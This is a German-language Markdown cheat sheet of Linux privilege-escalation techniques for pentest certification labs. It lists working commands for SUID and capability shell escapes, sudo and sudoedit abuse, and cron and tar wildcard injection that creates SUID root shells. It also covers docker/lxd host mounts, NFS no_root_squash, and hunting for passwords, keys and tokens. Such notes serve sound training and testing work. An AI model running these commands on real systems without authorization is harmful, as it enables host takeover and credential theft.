# Linux Privilege Escalation Notes

> Methodik-Sammlung für Local Privilege Escalation auf Linux-Hosts —
> orientiert an OSCP / PNPT / PenTest+ Lab-Kontexten.

## Methodik

```
Recon → Enumeration → Hypothesis → Validation → Escalation → Cleanup
```

Tooling (LinPEAS, LSE) bestätigt nur, was Methodik findet. Erst verstehen, was der Host ist —
dann gezielt eskalieren.

---

## 1. Initial Recon

### Host & Kernel

```bash
hostname
uname -a
uname -r
cat /etc/os-release
cat /etc/issue
arch
```

**Worauf achten:**
- Kernel-Version (Abgleich mit DirtyPipe / DirtyCow / OverlayFS-CVE)
- Distribution (Ubuntu / Debian / RHEL / Alpine — beeinflusst Pfade)
- Architektur (x86_64 / ARM für Kompilierung)

### Identität & Privilegien

```bash
id
whoami
groups
sudo -l
last
w
who
```

**Wichtig:**
- Bin ich in einer privilegierten Gruppe? (`docker`, `lxd`, `disk`, `wheel`, `video`, `adm`)
- Welche Sudo-Rechte habe ich (`sudo -l`) — mit oder ohne Passwort?
- Welche User sind aktiv eingeloggt?

### Netzwerk & Services

```bash
ip a
ip route
ss -tulpen
netstat -tulpn 2>/dev/null
ps auxf
ps -ef --forest
```

**Worauf achten:**
- Localhost-only-Services (oft schwächer abgesichert) — Port-Forward-Kandidaten
- Ungewöhnliche Prozesse / Cron-Tasks (`pspy`)
- Container-Indikatoren (`/.dockerenv`, `cat /proc/1/cgroup`)

---

## 2. SUID / SGID / Capabilities

### SUID-Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

Gegen [GTFOBins](https://gtfobins.github.io) abgleichen. Klassiker:

| Binary    | SUID → Root via                     |
|-----------|-------------------------------------|
| `find`    | `find . -exec /bin/sh -p \; -quit`  |
| `vim`     | `:set shell=/bin/sh`, `:!sh`        |
| `nmap`    | (alte Versionen) `--interactive`    |
| `bash`    | `bash -p`                           |
| `cp` / `mv` | `/etc/passwd`-Manipulation        |
| `tar`     | Checkpoint-Action                   |
| `awk`     | `awk 'BEGIN {system("/bin/sh -p")}'`|
| `python` *| `os.execl("/bin/sh", "sh", "-p")`   |

\* nur wenn als SUID gesetzt — selten, aber möglich.

### Capabilities

```bash
getcap -r / 2>/dev/null
```

**Hochinteressante Capabilities:**

| Capability        | Vector                                   |
|-------------------|------------------------------------------|
| `cap_setuid+ep`   | UID-Switch (Python: `os.setuid(0)`)      |
| `cap_dac_read_search+ep` | Lese-Bypass auf alle Dateien      |
| `cap_dac_override+ep`    | Lese-/Schreib-Bypass               |
| `cap_sys_admin`   | praktisch Root                           |
| `cap_chown+ep`    | Ownership-Manipulation                   |

```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### SGID

```bash
find / -perm -2000 -type f 2>/dev/null
```

Gleiche GTFOBins-Logik mit Group-Privilegien.

---

## 3. Sudo

### Übersicht

```bash
sudo -l
sudo -V
```

### Misconfigurations

| Symptom                              | Eskalation                            |
|--------------------------------------|---------------------------------------|
| `(ALL) NOPASSWD: ALL`                | `sudo su -`                           |
| `(ALL) NOPASSWD: /usr/bin/<binary>`  | GTFOBins-Lookup                       |
| Wildcard im Pfad (`/usr/bin/find *`) | Argument-Injection                    |
| `env_keep+=LD_PRELOAD`               | LD_PRELOAD-Hijack                     |
| `env_keep+=LD_LIBRARY_PATH`          | Library-Hijack                        |
| `env_keep+=PYTHONPATH`               | Python-Module-Hijack                  |

### CVE-2021-3156 (Baron Samedit)

Heap-Overflow in `sudoedit`. Auf älteren Sudo-Versionen (< 1.9.5p2) kritisch.

```bash
sudo -V | head -1
```

### CVE-2023-22809 (sudoedit -e)

Wenn User `sudoedit` für eine spezifische Datei darf, aber `EDITOR` / `VISUAL` / `SUDO_EDITOR`
mehrere Dateien akzeptieren:

```bash
EDITOR='vim -- /etc/sudoers' sudoedit /allowed/file
```

---

## 4. Cron Jobs

### Auflistung

```bash
ls -la /etc/cron.*/
cat /etc/crontab
cat /var/spool/cron/crontabs/* 2>/dev/null
crontab -l
```

### Live-Monitoring

```bash
./pspy64 -pf -i 1000
```

`pspy` zeigt Prozesse aller User ohne Root — Goldstandard für Cron-Discovery.

### Vektoren

- **Beschreibbare Cron-Skripte** → Code als Cron-User
- **PATH-Hijacking** wenn Cron-Script relative Befehle nutzt
- **Wildcard-Abuse** in `tar` / `chown` / `rsync`-Cron-Befehlen
- **World-writable Verzeichnisse** in cron-genutzten Pfaden

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /writable/cron-script.sh
```

---

## 5. Schreibbare Pfade & PATH-Hijack

### Writable in PATH

```bash
echo $PATH | tr ':' '\n'
for p in $(echo $PATH | tr ':' ' '); do test -w "$p" && echo "WRITABLE: $p"; done
```

Wenn `.` oder `~` im PATH und ein Sudo-Befehl relative Aufrufe nutzt → Hijack-Vektor.

### Writable Sensitive Files

```bash
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable ! -user $(whoami) 2>/dev/null
ls -l /etc/passwd /etc/shadow /etc/sudoers
```

`/etc/passwd` weltschreibbar → eigenen Root-User mit `mkpasswd` einbauen.

### Wildcard-Abuse

Cron läuft `tar -czf /backup/x.tar.gz /home/user/*`:

```bash
cd /home/user
echo 'cp /bin/bash /tmp/b; chmod +s /tmp/b' > exploit.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh exploit.sh'
```

---

## 6. Kernel Exploits

Letzter Ausweg — können Hosts crashen.

```bash
uname -r
searchsploit linux kernel <version>
```

| Kernel-Lücke      | CVE              | Range                          |
|-------------------|------------------|--------------------------------|
| DirtyPipe         | CVE-2022-0847    | 5.8 – 5.16.x                   |
| DirtyCow          | CVE-2016-5195    | < 4.8.3                        |
| PwnKit (polkit)   | CVE-2021-4034    | distro-abhängig                |
| OverlayFS         | CVE-2023-0386    | 5.11 – 6.2-rc                  |
| Sequoia (`size_t`)| CVE-2021-33909   | < 5.14                         |
| Looney Tunables   | CVE-2023-4911    | glibc 2.34+                    |

---

## 7. Container / Sandbox Escapes

### Sind wir in einem Container?

```bash
ls /.dockerenv 2>/dev/null && echo "Docker"
cat /proc/1/cgroup
cat /proc/self/status | grep -i cap
```

### Privileged Container

```bash
mount | grep cgroup
ls /dev | grep -E '(sda|nvme)'
cat /proc/self/status | grep CapEff
```

`CapEff: 0000003fffffffff` = "ich bin praktisch Root auf dem Host".

### Mounted Docker-Socket

```bash
ls -l /var/run/docker.sock
```

Wenn beschreibbar:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### LXD-Group

```bash
groups | grep lxd
lxc image import alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydev disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

### Docker-Group

User in `docker`-Gruppe = Root-Equivalent:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## 8. Credentials Hunting

### Klassische Pfade

```bash
grep -RnsiE "password|passwd|secret|token|api[_-]key" /home /var/www /etc 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name "*.kdbx" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name ".env" 2>/dev/null
```

### History-Files

```bash
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.ash_history
cat ~/.python_history
cat ~/.mysql_history
cat ~/.psql_history
```

### Mounted Filesystems

```bash
cat /etc/fstab
mount
cat /proc/mounts
```

Backups, NFS-Shares, alte Disk-Images können Credentials enthalten.

### Database-Dumps

```bash
find / -name "*.sql" -o -name "*.db" -o -name "*.sqlite*" 2>/dev/null
```

---

## 9. NFS Misconfigurations

### `no_root_squash`

Server exportiert `/share` mit `no_root_squash`. Lokal als Root mounten:

```bash
showmount -e <target>
sudo mount -t nfs <target>:/share /mnt/nfs
sudo cp /bin/bash /mnt/nfs/rootbash
sudo chown root:root /mnt/nfs/rootbash
sudo chmod +s /mnt/nfs/rootbash
```

Auf dem Target dann `/share/rootbash -p` → Root.

---

## 10. Automated Enumeration

```bash
./linpeas.sh
./lse.sh -l 2
./linux-exploit-suggester.sh
./pspy64 -pf -i 1000
```

| Tool                       | Stärke                                        |
|----------------------------|-----------------------------------------------|
| LinPEAS                    | breit, farbcodiert, beste All-in-One-Wahl     |
| LSE                        | sehr detailliert, langsamer                   |
| linux-exploit-suggester    | Kernel-CVE-Mapping                            |
| pspy                       | Prozess-Monitor ohne Root (Cron-Discovery)    |
| BeRoot                     | leichtgewichtig, fokussiert                   |

**Methodik vor Tooling.** Wer LinPEAS-Output blind durcharbeitet, ohne zu wissen, was er sucht,
verliert sich. Tools sind Bestätigung, nicht Ersatz.

---

## Cleanup-Checkliste

- Reverse-Shells beendet
- Erstellte Files entfernt (`/tmp`, `/var/tmp`, `/dev/shm`)
- Modifizierte Dateien zurückgesetzt
- Bash-History bereinigt (kontextabhängig — bei Pentest dokumentieren statt löschen)
- Cron-Modifikationen rückgängig

---

## References

- [GTFOBins](https://gtfobins.github.io)
- [HackTricks – Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
- [PayloadsAllTheThings – Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [PEASS-ng (linPEAS)](https://github.com/peass-ng/PEASS-ng)
- [pspy](https://github.com/DominicBreuker/pspy)
- [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
